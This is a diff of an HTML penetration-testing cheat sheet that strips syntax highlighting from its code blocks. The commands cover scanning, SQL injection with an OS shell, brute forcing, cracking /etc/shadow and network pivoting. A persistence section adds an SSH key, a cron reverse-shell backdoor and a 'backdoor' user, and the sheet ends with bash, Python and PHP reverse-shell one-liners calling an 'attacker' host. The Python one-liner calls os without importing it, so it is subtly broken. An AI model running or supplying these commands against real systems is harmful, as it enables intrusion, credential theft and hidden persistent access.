@@ -87,17 +87,6 @@
         a:hover {
             text-decoration: underline;
         }
-        /* Force all syntax highlighting spans to black */
-        .codehilite pre span,
-        .codehilite pre span.c, .codehilite pre span.c1, .codehilite pre span.ch,
-        .codehilite pre span.k, .codehilite pre span.kd, .codehilite pre span.kr,
-        .codehilite pre span.m, .codehilite pre span.mi,
-        .codehilite pre span.n, .codehilite pre span.nb, .codehilite pre span.nc, .codehilite pre span.nf, .codehilite pre span.nv,
-        .codehilite pre span.o,
-        .codehilite pre span.p, .codehilite pre span.py,
-        .codehilite pre span.s, .codehilite pre span.s1, .codehilite pre span.s2, .codehilite pre span.se,
-        .codehilite pre span.w { color: #000000 !important; }
-        pre span { color: #000000 !important; }
         @media print {
             body { margin: 0; padding: 10px; }
             pre { page-break-inside: avoid; }
@@ -115,14 +104,14 @@
 <h3 id="nmap-network-scanning">NMAP - Network Scanning</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Fast basic scan:</span>
-nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p-<span class="w"> </span><span class="m">192</span>.168.1.100
+<pre><code># Fast basic scan:
+nmap -sV -sC -p- 192.168.1.100
 
-<span class="c1"># Save all formats:</span>
-nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p-<span class="w"> </span>-oA<span class="w"> </span>results<span class="w"> </span><span class="m">192</span>.168.1.100
+# Save all formats:
+nmap -sV -sC -p- -oA results 192.168.1.100
 
-<span class="c1"># Host discovery:</span>
-nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.1.0/24
+# Host discovery:
+nmap -sn 192.168.1.0/24
 </code></pre>
 </div>
 
@@ -131,14 +120,14 @@ nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span
 <h3 id="gobuster-directory-brute-force">GOBUSTER - Directory Brute Force</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Basic web scan:</span>
-gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://target<span class="w"> </span>-w<span class="w"> </span>wordlist.txt
+<pre><code># Basic web scan:
+gobuster dir -u http://target -w wordlist.txt
 
-<span class="c1"># With extensions:</span>
-gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://target<span class="w"> </span>-w<span class="w"> </span>wordlist.txt<span class="w"> </span>-x<span class="w"> </span>php,txt
+# With extensions:
+gobuster dir -u http://target -w wordlist.txt -x php,txt
 
-<span class="c1"># Subdomains:</span>
-gobuster<span class="w"> </span>dns<span class="w"> </span>-d<span class="w"> </span>target.com<span class="w"> </span>-w<span class="w"> </span>subdomains.txt
+# Subdomains:
+gobuster dns -d target.com -w subdomains.txt
 </code></pre>
 </div>
 
@@ -147,14 +136,14 @@ gobuster<span class="w"> </span>dns<span class="w"> </span>-d<span class="w"> </
 <h3 id="nikto-web-vulnerability-scan">NIKTO - Web Vulnerability Scan</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Basic scan:</span>
-nikto<span class="w"> </span>-h<span class="w"> </span>http://target
+<pre><code># Basic scan:
+nikto -h http://target
 
-<span class="c1"># With output:</span>
-nikto<span class="w"> </span>-h<span class="w"> </span>http://target<span class="w"> </span>-o<span class="w"> </span>report.html<span class="w"> </span>-F<span class="w"> </span>htm
+# With output:
+nikto -h http://target -o report.html -F htm
 
-<span class="c1"># HTTPS:</span>
-nikto<span class="w"> </span>-h<span class="w"> </span>https://target<span class="w"> </span>-ssl
+# HTTPS:
+nikto -h https://target -ssl
 </code></pre>
 </div>
 
@@ -163,14 +152,14 @@ nikto<span class="w"> </span>-h<span class="w"> </span>https://target<span class
 <h3 id="enum4linux-smb-enumeration">ENUM4LINUX - SMB Enumeration</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Full enumeration:</span>
-enum4linux<span class="w"> </span>-A<span class="w"> </span><span class="m">192</span>.168.1.100
+<pre><code># Full enumeration:
+enum4linux -A 192.168.1.100
 
-<span class="c1"># Just users:</span>
-enum4linux<span class="w"> </span>-U<span class="w"> </span><span class="m">192</span>.168.1.100
+# Just users:
+enum4linux -U 192.168.1.100
 
-<span class="c1"># Just shares:</span>
-enum4linux<span class="w"> </span>-S<span class="w"> </span><span class="m">192</span>.168.1.100
+# Just shares:
+enum4linux -S 192.168.1.100
 </code></pre>
 </div>
 
@@ -179,14 +168,14 @@ enum4linux<span class="w"> </span>-S<span class="w"> </span><span class="m">192<
 <h3 id="netcat-banner-grabbing">NETCAT - Banner Grabbing</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Grab banner:</span>
-<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-v<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">22</span>
+<pre><code># Grab banner:
+echo &quot;&quot; | nc -v 192.168.1.100 22
 
-<span class="c1"># Port scan:</span>
-nc<span class="w"> </span>-zv<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">443</span><span class="w"> </span><span class="m">3306</span>
+# Port scan:
+nc -zv 192.168.1.100 80 443 3306
 
-<span class="c1"># Listener (reverse shell):</span>
-nc<span class="w"> </span>-l<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span>
+# Listener (reverse shell):
+nc -l -p 4444
 </code></pre>
 </div>
 
@@ -195,14 +184,14 @@ nc<span class="w"> </span>-l<span class="w"> </span>-p<span class="w"> </span><s
 <h3 id="dignslookup-dns-enumeration">DIG/NSLOOKUP - DNS Enumeration</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Basic lookup:</span>
-dig<span class="w"> </span>example.com
+<pre><code># Basic lookup:
+dig example.com
 
-<span class="c1"># Get mail servers:</span>
-dig<span class="w"> </span>example.com<span class="w"> </span>MX<span class="w"> </span>+short
+# Get mail servers:
+dig example.com MX +short
 
-<span class="c1"># Zone transfer attempt:</span>
-dig<span class="w"> </span>@ns1.example.com<span class="w"> </span>example.com<span class="w"> </span>AXFR
+# Zone transfer attempt:
+dig @ns1.example.com example.com AXFR
 </code></pre>
 </div>
 
@@ -211,14 +200,14 @@ dig<span class="w"> </span>@ns1.example.com<span class="w"> </span>example.com<s
 <h3 id="smbclientsmbmap-smb-access">SMBCLIENT/SMBMAP - SMB Access</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># List shares:</span>
-smbclient<span class="w"> </span>-L<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-N
+<pre><code># List shares:
+smbclient -L 192.168.1.100 -N
 
-<span class="c1"># Connect to share:</span>
-smbclient<span class="w"> </span>//192.168.1.100/share<span class="w"> </span>-N
+# Connect to share:
+smbclient //192.168.1.100/share -N
 
-<span class="c1"># Check permissions:</span>
-smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.100
+# Check permissions:
+smbmap -H 192.168.1.100
 </code></pre>
 </div>
 
@@ -227,14 +216,14 @@ smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</spa
 <h3 id="snmpwalk-snmp-enumeration">SNMPWALK - SNMP Enumeration</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Basic enumeration:</span>
-snmpwalk<span class="w"> </span>-v<span class="w"> </span>2c<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="m">192</span>.168.1.1
+<pre><code># Basic enumeration:
+snmpwalk -v 2c -c public 192.168.1.1
 
-<span class="c1"># System description:</span>
-snmpwalk<span class="w"> </span>-v<span class="w"> </span>2c<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="m">192</span>.168.1.1<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1.1
+# System description:
+snmpwalk -v 2c -c public 192.168.1.1 1.3.6.1.2.1.1.1
 
-<span class="c1"># Processes:</span>
-snmpwalk<span class="w"> </span>-v<span class="w"> </span>2c<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="m">192</span>.168.1.1<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.4
+# Processes:
+snmpwalk -v 2c -c public 192.168.1.1 1.3.6.1.2.1.25.4
 </code></pre>
 </div>
 
@@ -247,14 +236,14 @@ snmpwalk<span class="w"> </span>-v<span class="w"> </span>2c<span class="w"> </s
 <h3 id="searchsploit-find-exploits">SEARCHSPLOIT - Find Exploits</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Find Apache exploits:</span>
-searchsploit<span class="w"> </span>Apache<span class="w"> </span><span class="m">2</span>.4.6
+<pre><code># Find Apache exploits:
+searchsploit Apache 2.4.6
 
-<span class="c1"># Show full path:</span>
-searchsploit<span class="w"> </span>-p<span class="w"> </span><span class="m">24659</span>
+# Show full path:
+searchsploit -p 24659
 
-<span class="c1"># View code:</span>
-searchsploit<span class="w"> </span>-x<span class="w"> </span><span class="m">24659</span>
+# View code:
+searchsploit -x 24659
 </code></pre>
 </div>
 
@@ -263,17 +252,17 @@ searchsploit<span class="w"> </span>-x<span class="w"> </span><span class="m">24
 <h3 id="curl-manual-http-testing">CURL - Manual HTTP Testing</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Basic request:</span>
-curl<span class="w"> </span>-v<span class="w"> </span>http://target/page
+<pre><code># Basic request:
+curl -v http://target/page
 
-<span class="c1"># With POST data:</span>
-curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;user=admin&amp;pass=pass&quot;</span><span class="w"> </span>http://target/login
+# With POST data:
+curl -X POST -d &quot;user=admin&amp;pass=pass&quot; http://target/login
 
-<span class="c1"># Follow redirects:</span>
-curl<span class="w"> </span>-L<span class="w"> </span>http://target
+# Follow redirects:
+curl -L http://target
 
-<span class="c1"># Custom header:</span>
-curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer TOKEN&quot;</span><span class="w"> </span>http://target/api
+# Custom header:
+curl -H &quot;Authorization: Bearer TOKEN&quot; http://target/api
 </code></pre>
 </div>
 
@@ -282,17 +271,17 @@ curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Aut
 <h3 id="sqlmap-sql-injection">SQLMAP - SQL Injection</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Test parameter:</span>
-sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target/page?id=1&quot;</span>
+<pre><code># Test parameter:
+sqlmap -u &quot;http://target/page?id=1&quot;
 
-<span class="c1"># Extract databases:</span>
-sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target/page?id=1&quot;</span><span class="w"> </span>--dbs
+# Extract databases:
+sqlmap -u &quot;http://target/page?id=1&quot; --dbs
 
-<span class="c1"># Dump table:</span>
-sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target/page?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>db<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>--dump
+# Dump table:
+sqlmap -u &quot;http://target/page?id=1&quot; -D db -T users --dump
 
-<span class="c1"># OS command:</span>
-sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target/page?id=1&quot;</span><span class="w"> </span>--os-shell
+# OS command:
+sqlmap -u &quot;http://target/page?id=1&quot; --os-shell
 </code></pre>
 </div>
 
@@ -301,14 +290,14 @@ sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;h
 <h3 id="hydra-brute-force">HYDRA - Brute Force</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># SSH brute force:</span>
-hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>ssh://target
+<pre><code># SSH brute force:
+hydra -L users.txt -P pass.txt ssh://target
 
-<span class="c1"># FTP brute force:</span>
-hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>ftp://target
+# FTP brute force:
+hydra -L users.txt -P pass.txt ftp://target
 
-<span class="c1"># HTTP form:</span>
-hydra<span class="w"> </span>-L<span class="w"> </span>users<span class="w"> </span>-P<span class="w"> </span>pass<span class="w"> </span>http-post-form://target/login:user<span class="o">=</span>^USER^<span class="p">&amp;</span><span class="nv">pass</span><span class="o">=</span>^PASS^:F<span class="o">=</span>Login
+# HTTP form:
+hydra -L users -P pass http-post-form://target/login:user=^USER^&amp;pass=^PASS^:F=Login
 </code></pre>
 </div>
 
@@ -317,14 +306,14 @@ hydra<span class="w"> </span>-L<span class="w"> </span>users<span class="w"> </s
 <h3 id="ffuf-web-fuzzing">FFUF - Web Fuzzing</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Directory fuzz:</span>
-ffuf<span class="w"> </span>-u<span class="w"> </span>http://target/FUZZ<span class="w"> </span>-w<span class="w"> </span>wordlist.txt
+<pre><code># Directory fuzz:
+ffuf -u http://target/FUZZ -w wordlist.txt
 
-<span class="c1"># Subdomain fuzz:</span>
-ffuf<span class="w"> </span>-u<span class="w"> </span>http://FUZZ.target.com<span class="w"> </span>-w<span class="w"> </span>subdomains.txt
+# Subdomain fuzz:
+ffuf -u http://FUZZ.target.com -w subdomains.txt
 
-<span class="c1"># Parameter fuzz:</span>
-ffuf<span class="w"> </span>-u<span class="w"> </span>http://target/search?q<span class="o">=</span>FUZZ<span class="w"> </span>-w<span class="w"> </span>words.txt
+# Parameter fuzz:
+ffuf -u http://target/search?q=FUZZ -w words.txt
 </code></pre>
 </div>
 
@@ -337,11 +326,11 @@ ffuf<span class="w"> </span>-u<span class="w"> </span>http://target/search?q<spa
 <h3 id="john-hash-cracking">JOHN - Hash Cracking</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Crack shadow file:</span>
-john<span class="w"> </span>/etc/shadow<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+<pre><code># Crack shadow file:
+john /etc/shadow --wordlist=/usr/share/wordlists/rockyou.txt
 
-<span class="c1"># Show results:</span>
-john<span class="w"> </span>--show<span class="w"> </span>/etc/shadow
+# Show results:
+john --show /etc/shadow
 </code></pre>
 </div>
 
@@ -350,14 +339,14 @@ john<span class="w"> </span>--show<span class="w"> </span>/etc/shadow
 <h3 id="hashcat-gpu-cracking">HASHCAT - GPU Cracking</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Crack MD5:</span>
-hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">0</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hashes.txt<span class="w"> </span>rockyou.txt
+<pre><code># Crack MD5:
+hashcat -m 0 -a 0 hashes.txt rockyou.txt
 
-<span class="c1"># Crack NTLM:</span>
-hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1000</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hashes.txt<span class="w"> </span>rockyou.txt
+# Crack NTLM:
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt
 
-<span class="c1"># Show results:</span>
-hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">0</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hashes.txt<span class="w"> </span>rockyou.txt<span class="w"> </span>--show
+# Show results:
+hashcat -m 0 -a 0 hashes.txt rockyou.txt --show
 </code></pre>
 </div>
 
@@ -366,13 +355,13 @@ hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">0</span
 <h3 id="linpeas-privilege-escalation-enum">LINPEAS - Privilege Escalation Enum</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Run linpeas:</span>
+<pre><code># Run linpeas:
 ./linpeas.sh
 
-<span class="c1"># Save output:</span>
-./linpeas.sh<span class="w"> </span>&gt;<span class="w"> </span>linpeas.txt
+# Save output:
+./linpeas.sh &gt; linpeas.txt
 
-<span class="c1"># Look for RED items (critical)</span>
+# Look for RED items (critical)
 </code></pre>
 </div>
 
@@ -392,14 +381,14 @@ hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">0</span
 <h3 id="ssh-tunneling-port-forwarding">SSH TUNNELING - Port Forwarding</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Local port forward:</span>
-ssh<span class="w"> </span>-L<span class="w"> </span><span class="m">9999</span>:internal:80<span class="w"> </span>user@pivot
+<pre><code># Local port forward:
+ssh -L 9999:internal:80 user@pivot
 
-<span class="c1"># SOCKS proxy:</span>
-ssh<span class="w"> </span>-D<span class="w"> </span><span class="m">9050</span><span class="w"> </span>user@pivot<span class="w"> </span>-N<span class="w"> </span>-f
+# SOCKS proxy:
+ssh -D 9050 user@pivot -N -f
 
-<span class="c1"># Remote port forward:</span>
-ssh<span class="w"> </span>-R<span class="w"> </span><span class="m">9999</span>:localhost:3306<span class="w"> </span>user@pivot
+# Remote port forward:
+ssh -R 9999:localhost:3306 user@pivot
 </code></pre>
 </div>
 
@@ -408,14 +397,14 @@ ssh<span class="w"> </span>-R<span class="w"> </span><span class="m">9999</span>
 <h3 id="proxychains-route-through-proxy">PROXYCHAINS - Route Through Proxy</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Setup SOCKS first:</span>
-ssh<span class="w"> </span>-D<span class="w"> </span><span class="m">9050</span><span class="w"> </span>user@pivot<span class="w"> </span><span class="p">&amp;</span>
+<pre><code># Setup SOCKS first:
+ssh -D 9050 user@pivot &amp;
 
-<span class="c1"># Scan through proxy:</span>
-proxychains<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span><span class="m">10</span>.0.0.0/24
+# Scan through proxy:
+proxychains nmap -sV 10.0.0.0/24
 
-<span class="c1"># Web through proxy:</span>
-proxychains<span class="w"> </span>curl<span class="w"> </span>http://internal:80
+# Web through proxy:
+proxychains curl http://internal:80
 </code></pre>
 </div>
 
@@ -424,11 +413,11 @@ proxychains<span class="w"> </span>curl<span class="w"> </span>http://internal:8
 <h3 id="chisel-http-tunneling">CHISEL - HTTP Tunneling</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Attacker (server):</span>
-chisel<span class="w"> </span>server<span class="w"> </span>-p<span class="w"> </span><span class="m">8080</span><span class="w"> </span>--reverse
+<pre><code># Attacker (server):
+chisel server -p 8080 --reverse
 
-<span class="c1"># Target (client):</span>
-chisel<span class="w"> </span>client<span class="w"> </span>http://attacker:8080<span class="w"> </span>R:socks
+# Target (client):
+chisel client http://attacker:8080 R:socks
 </code></pre>
 </div>
 
@@ -437,11 +426,11 @@ chisel<span class="w"> </span>client<span class="w"> </span>http://attacker:8080
 <h3 id="metasploit-routing">METASPLOIT ROUTING</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># In msfconsole:</span>
-route<span class="w"> </span>add<span class="w"> </span><span class="m">10</span>.0.0.0<span class="w"> </span><span class="m">255</span>.255.255.0<span class="w"> </span><span class="o">[</span>session_id<span class="o">]</span>
-route<span class="w"> </span>print
+<pre><code># In msfconsole:
+route add 10.0.0.0 255.255.255.0 [session_id]
+route print
 
-<span class="c1"># Then scan/exploit through route</span>
+# Then scan/exploit through route
 </code></pre>
 </div>
 
@@ -454,44 +443,44 @@ route<span class="w"> </span>print
 <h3 id="information-gathering">Information Gathering</h3>
 
 <div class="codehilite">
-<pre><span></span><code>whoami<span class="w">              </span><span class="c1"># Current user</span>
-id<span class="w">                 </span><span class="c1"># User &amp; groups</span>
-hostname<span class="w">           </span><span class="c1"># Machine name</span>
-uname<span class="w"> </span>-a<span class="w">           </span><span class="c1"># OS info</span>
-ifconfig<span class="w"> </span>/<span class="w"> </span>ip<span class="w"> </span>addr<span class="w"> </span><span class="c1"># Network config</span>
-<span class="nb">pwd</span><span class="w">                </span><span class="c1"># Current directory</span>
-cat<span class="w"> </span>/etc/passwd<span class="w">    </span><span class="c1"># User list</span>
-cat<span class="w"> </span>/etc/shadow<span class="w">    </span><span class="c1"># Hashes (if root)</span>
-sudo<span class="w"> </span>-l<span class="w">            </span><span class="c1"># Sudo permissions</span>
+<pre><code>whoami              # Current user
+id                 # User &amp; groups
+hostname           # Machine name
+uname -a           # OS info
+ifconfig / ip addr # Network config
+pwd                # Current directory
+cat /etc/passwd    # User list
+cat /etc/shadow    # Hashes (if root)
+sudo -l            # Sudo permissions
 </code></pre>
 </div>
 
 <h3 id="persistence">Persistence</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Add SSH key:</span>
-<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ssh-rsa KEY&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.ssh/authorized_keys
+<pre><code># Add SSH key:
+echo &quot;ssh-rsa KEY&quot; &gt;&gt; ~/.ssh/authorized_keys
 
-<span class="c1"># Add cron backdoor:</span>
-<span class="o">(</span>crontab<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/attacker/port 0&gt;&amp;1&quot;</span><span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>crontab<span class="w"> </span>-
+# Add cron backdoor:
+(crontab -l; echo &quot;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/attacker/port 0&gt;&amp;1&quot;) | crontab -
 
-<span class="c1"># Add user:</span>
-useradd<span class="w"> </span>-m<span class="w"> </span>-s<span class="w"> </span>/bin/bash<span class="w"> </span>backdoor
-<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;backdoor:password&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>chpasswd
+# Add user:
+useradd -m -s /bin/bash backdoor
+echo &quot;backdoor:password&quot; | chpasswd
 </code></pre>
 </div>
 
 <h3 id="reverse-shell-one-liners">Reverse Shell One-Liners</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Bash:</span>
-bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/attacker/port<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+<pre><code># Bash:
+bash -i &gt;&amp; /dev/tcp/attacker/port 0&gt;&amp;1
 
-<span class="c1"># Python:</span>
-python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import socket,subprocess;s=socket.socket();s.connect((&quot;attacker&quot;,port));os.dup2(s.fileno(),0);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#39;</span>
+# Python:
+python -c &#39;import socket,subprocess;s=socket.socket();s.connect((&quot;attacker&quot;,port));os.dup2(s.fileno(),0);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#39;
 
-<span class="c1"># PHP:</span>
-php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;$sock=fsockopen(&quot;attacker&quot;,port);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
+# PHP:
+php -r &#39;$sock=fsockopen(&quot;attacker&quot;,port);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
 </code></pre>
 </div>
 
